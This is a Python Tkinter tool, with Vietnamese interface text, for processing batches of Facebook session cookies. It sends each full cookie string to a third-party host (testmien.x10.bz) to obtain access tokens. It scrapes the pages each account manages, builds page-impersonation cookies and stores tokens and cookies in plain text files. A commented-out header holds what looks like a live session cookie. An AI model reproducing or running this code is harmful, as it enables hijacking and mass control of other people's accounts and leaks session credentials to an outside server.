import tkinter as tk
from tkinter import ttk 
from PIL import Image, ImageTk
from tkinter import messagebox 
from threading import Thread
from time import sleep
import requests
import pyperclip  # Module để truy cập clipboard
import os
import gop
import threading
import subprocess


class api:
    
    def __init__(self) -> None:
        self.acclive = 0
        self.accdie = 0
        self.sopage = 0
        self.saveaccandpage = ''

        self.headers = {
            'authority': 'mbasic.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'cache-control': 'no-cache',
            # 'cookie': 'sb=ghGyZMQNd-t6C2gxm9HaLy-K; datr=06z5ZKQ_PD93TumELUma7cKL; c_user=61553593387589; m_page_voice=61553593387589; wd=1920x953; xs=26%3AxiRE_Mj5FTTHXw%3A2%3A1702093751%3A-1%3A3840%3A%3AAcXgp1cnQnA_P0BM0gKajywPOSKux8f9lBXZkvPJLbNV; fr=1F8xDEivHDXIRkOGa.AWV3ZyPVlx1mv7TVdNvZW1k28PM.BlrnSJ.QI.AAA.0.0.BlrnSO.AWVA8j9XCWw; presence=C%7B%22t3%22%3A%5B%7B%22o%22%3A0%2C%22i%22%3A%22u.100084875303481%22%7D%5D%2C%22utc3%22%3A1705931980995%2C%22v%22%3A1%7D',
            'dpr': '1',
            'pragma': 'no-cache',
            'referer': 'https://mbasic.facebook.com/groups/?category=membership&ref_component=mbasic_home_header&ref_page=%2Fwap%2Fprofile_tribe.php&refid=18&paipv=0&eav=AfYJ6S5zcXGn5g1V7l6Vi5yawN-eek0udvObJuP5HH424cC-UOXTCLarroH1kSpcYZc',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.225", "Google Chrome";v="120.0.6099.225"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'viewport-width': '958',
        }
        
    def savecookie(self,lckie,tree,thongtincookie1,thongtin):
        self.idpage = []
        self.ck = lckie[self.i]
        try:
            try:
                self.cookies = {
                    'sb': self.ck.split('sb=')[1].split(';')[0],
                    'datr': self.ck.split('datr=')[1].split(';')[0],
                    'c_user': self.ck.split('c_user=')[1].split(';')[0],
                    'xs': self.ck.split('xs=')[1].split(';')[0],
                    'fr': self.ck.split('fr=')[1].split(';')[0],
                    'presence': self.ck.split('presence=')[1].split(';')[0],
                }
            except:
                self.cookies = {
                    'sb': self.ck.split('sb=')[1].split(';')[0],
                    'datr': self.ck.split('datr=')[1].split(';')[0],
                    'c_user': self.ck.split('c_user=')[1].split(';')[0],
                    'xs': self.ck.split('xs=')[1].split(';')[0],
                    'fr': self.ck.split('fr=')[1].split(';')[0],
                }
            
            response = requests.get('https://www.facebook.com/pages/?category=your_pages&ref=bookmarks', cookies=self.cookies, headers=self.headers).text
            id = response.split()
            import re

            for i in id:
                if '"is_profile_plus":true' in i:
                    ids = re.findall(r'"is_profile_plus":true,"id":"(\d+)"', i)

                    # In ra các giá trị id tìm được
                    for id_value in ids:
                        self.idpage.append(id_value)
            re = requests.get(f'https://testmien.x10.bz/api/api404team/16token.php?cookie={self.ck}&type=5').json()
            self.sopage += len(self.idpage)
            label1 = tk.Label(thongtin, text=f"{self.sopage}",fg='#f0ffff',bg='#708090', font=("Times New Roman", 15))
            label1.place(x=530,y=35)
            try:
                name = re['name']
                uid = re['uid']
                access_token = re['access_token']

                tree.insert("", "end", values=(self.i, name,uid,self.ck,access_token,len(self.idpage),'GetThanhCong'))
                try:
                    with open('nameacc.txt','a',encoding='utf-8') as f:
                        f.write(f'{name}\n')
                        f.close()
                    with open('acc.txt','a') as f:
                        f.write(f'{uid} {self.ck} \n')
                        f.close()
                    with open('access_tokenacc.txt','a') as f:
                        f.write(f'{access_token} \n')
                        f.close()
                except:
                    with open('nameacc.txt','w',encoding='utf-8') as f:
                        f.write(f'{name}\n')
                        f.close()
                    with open('acc.txt','w') as f:
                        f.write(f'{uid} {self.ck}\n')
                        f.close()
                    with open('access_tokenacc.txt','w') as f:
                        f.write(f'{access_token}\n')
                        f.close()
                self.acclive += 1
                label1 = tk.Label(thongtincookie1, text=f"{self.acclive}",fg='#f0ffff',bg='#708090', font=("Times New Roman", 15))
                label1.place(x=85,y=35)
                label1 = tk.Label(thongtincookie1, text=f"{self.sopage}",fg='#f0ffff',bg='#708090', font=("Times New Roman", 15))
                label1.place(x=530,y=35)
                
            except:
                tree.insert("", "end", values=(self.i, ' ',' ',self.ck,' ',' ','GetThatBai'))
                self.accdie += 1
                label1 = tk.Label(thongtincookie1, text=f"{self.accdie}",fg='#f0ffff',bg='#708090', font=("Times New Roman", 15))
                label1.place(x=285,y=35)
        except:
            tk.messagebox.showinfo(title='Lỗi', message=f'Cookie {self.ck} Die',)
    
    def savepage(self,tree,thongtinpage):
        self.access_tokenpage = []
        self.idpage = []
        self.cookiepage = []
        with open('acc.txt','r') as f:
            lckie = f.readlines()
        self.ck = lckie[self.i]
        self.ck = self.ck.split()[1]
        try:
            self.cookies = {
                'sb': self.ck.split('sb=')[1].split(';')[0],
                'datr': self.ck.split('datr=')[1].split(';')[0],
                'c_user': self.ck.split('c_user=')[1].split(';')[0],
                'xs': self.ck.split('xs=')[1].split(';')[0],
                'fr': self.ck.split('fr=')[1].split(';')[0],
                'presence': self.ck.split('presence=')[1].split(';')[0],
            }
        except:
            self.cookies = {
                'sb': self.ck.split('sb=')[1].split(';')[0],
                'datr': self.ck.split('datr=')[1].split(';')[0],
                'c_user': self.ck.split('c_user=')[1].split(';')[0],
                'xs': self.ck.split('xs=')[1].split(';')[0],
                'fr': self.ck.split('fr=')[1].split(';')[0],
            }
        with open('access_tokenacc.txt','r') as f:
            tokenacc = f.readlines()
            get_tokenpage = requests.get(f'https://graph.facebook.com/v12.0/me/accounts?fields=access_token&limit=200&access_token={tokenacc[self.i]}').json()['data']
            for i in range(len(get_tokenpage)):
                self.access_tokenpage.append(get_tokenpage[-1+i]['access_token'])
            print(len(get_tokenpage))
        response = requests.get('https://www.facebook.com/pages/?category=your_pages&ref=bookmarks', cookies=self.cookies, headers=self.headers).text
        id = response.split()
        import re

        for i in id:
            if '"is_profile_plus":true' in i:
                ids = re.findall(r'"is_profile_plus":true,"id":"(\d+)"', i)

                # In ra các giá trị id tìm được
                for id_value in ids:
                    self.idpage.append(id_value)

                    self.cookiepage.append(f"sb={self.ck.split('sb=')[1].split(';')[0]};datr={self.ck.split('datr=')[1].split(';')[0]};c_user={self.ck.split('c_user=')[1].split(';')[0]};i_user={id_value};m_page_voice={id_value};xs={self.ck.split('xs=')[1].split(';')[0]};fr={self.ck.split('fr=')[1].split(';')[0]}")
        print(self.idpage)
        for i in range(len(self.idpage)):
            with open('nameacc.txt','r',encoding='utf-8') as f:
                nameacc = f.readlines()
            with open('acc.txt','r',encoding='utf-8') as f:
                id = f.readlines()
            self.sopage += 1
            tree.insert("", "end", values=(self.sopage, nameacc[self.i],id[self.i].split()[1],self.idpage[i],self.cookiepage[i],self.access_tokenpage[i],'GetThanhCong'))
            
            try:
                with open('cookiepage.txt','a') as f:
                    f.write(f'{self.idpage[i]} {self.cookiepage[i]}\n')
                    f.close()
                with open('tokenpage.txt','a') as f:
                    f.write(f'{self.access_tokenpage[i]}\n')
                    f.close()
            except:
                with open('cookiepage.txt','w') as f:
                    f.write(f'{self.idpage[i]} {self.cookiepage[i]}\n')
                with open('tokenpage.txt','w') as f:
                    f.write(f'{self.access_tokenpage[i]}\n')
            
        label1 = tk.Label(thongtinpage, text=f"{len(id)}",fg='#f0ffff',bg='#708090', font=("Times New Roman", 15))
        label1.place(x=120,y=20)
        label1 = tk.Label(thongtinpage, text=f"{self.sopage}",fg='#f0ffff',bg='#708090', font=("Times New Roman", 15))
        label1.place(x=320,y=20)

        with open('acc.txt','r') as f:
            f = f.readlines()
        self.saveaccandpage += f'{f[self.i].split()[0]} {f[self.i].split()[1]} {len(self.idpage)}\n'
        if self.i == len(f)-1:
            os.remove('acc.txt')
            with open('acc.txt','w') as f:
                f.write(self.saveaccandpage)
                f.close()

    def getnewtoken(self,acc,tree,thongtincookie1):
        try:
            self.idpage = []
            self.ck = acc[self.i].split()[1]
            try:
                self.cookies = {
                    'sb': self.ck.split('sb=')[1].split(';')[0],
                    'datr': self.ck.split('datr=')[1].split(';')[0],
                    'c_user': self.ck.split('c_user=')[1].split(';')[0],
                    'xs': self.ck.split('xs=')[1].split(';')[0],
                    'fr': self.ck.split('fr=')[1].split(';')[0],
                    'presence': self.ck.split('presence=')[1].split(';')[0],
                }
            except:
                self.cookies = {
                    'sb': self.ck.split('sb=')[1].split(';')[0],
                    'datr': self.ck.split('datr=')[1].split(';')[0],
                    'c_user': self.ck.split('c_user=')[1].split(';')[0],
                    'xs': self.ck.split('xs=')[1].split(';')[0],
                    'fr': self.ck.split('fr=')[1].split(';')[0],
                }
            re = requests.get(f'https://testmien.x10.bz/api/api404team/16token.php?cookie={self.ck}&type=5').json()
            # try:
            name = re['name']
            uid = re['uid']
            access_token = re['access_token']
            current_values = tree.item(f'I00{self.i+1}', 'values')
            # Thay đổi giá trị của cột thứ 3 trong mỗi dòng
            response = requests.get('https://www.facebook.com/pages/?category=your_pages&ref=bookmarks', cookies=self.cookies, headers=self.headers).text
            id = response.split()
            for i in id:
                import re
                if '"is_profile_plus":true' in i:
                    match = re.search(r'"id":"(\d+)"', i)

                    if match:
                        result = match.group(1)
                        self.idpage.append(result)
            tree.item(f'I00{self.i+1}', values=(current_values[0], name, current_values[2], current_values[3], f"{access_token}", f"{len(self.idpage)}",'GetThanhCong'))

            
            
            
            try:
                with open('nameacc.txt','a',encoding='utf-8') as f:
                    f.write(f'{name}\n')
                    f.close()
                with open('access_tokenacc.txt','a') as f:
                    f.write(f'{access_token} \n')
                    f.close()
            except:
                with open('nameacc.txt','w',encoding='utf-8') as f:
                    f.write(f'{name}\n')
                    f.close()
                with open('access_tokenacc.txt','w') as f:
                    f.write(f'{access_token}\n')
                    f.close()
            self.acclive += 1
            self.sopage += len(self.idpage)
            label1 = tk.Label(thongtincookie1, text=f"{self.acclive}",fg='#f0ffff',bg='#708090', font=("Times New Roman", 15))
            label1.place(x=85,y=35)
            label1 = tk.Label(thongtincookie1, text=f"{self.sopage}",fg='#f0ffff',bg='#708090', font=("Times New Roman", 15))
            label1.place(x=530,y=35)
            # except:
            #     tree.item(f'I00{self.i+1}', values=(current_values[0], current_values[1], current_values[2], current_values[3], f" ", f" ",'GetThatBai'))
            #     self.accdie += 1
            #     label1 = tk.Label(thongtincookie1, text=f"{self.accdie}",fg='#f0ffff',bg='#708090', font=("Times New Roman", 15))
            #     label1.place(x=285,y=35)
        except:
            tk.messagebox.showinfo(title='Lỗi', message=f'ID Cookie {acc[self.i].split()[0]} Die',)
    def threadgetnewtoken(self,acc,tree,thongtincookie1):
        for self.i in range(len(acc)):
            thread = threading.Thread(target=self.getnewtoken(acc,tree,thongtincookie1))
            thread.start()

    def thread_savecookie(self,lckie,tree,thongtincookie1,thongtin):
        for self.i in range(len(lckie)):
            thread = threading.Thread(target=self.savecookie(lckie,tree,thongtincookie1,thongtin))
            thread.start()

    def threadgetpage(self,tree,thongtinpage):
        try:
            with open('acc.txt','r') as f:
                f = f.readlines()
            for self.i in range(len(f)):
                thread = threading.Thread(target=self.savepage(tree,thongtinpage))
                thread.start()
        except:
            tk.messagebox.showinfo(title='Lỗi', message='Không Có Cookie',)
        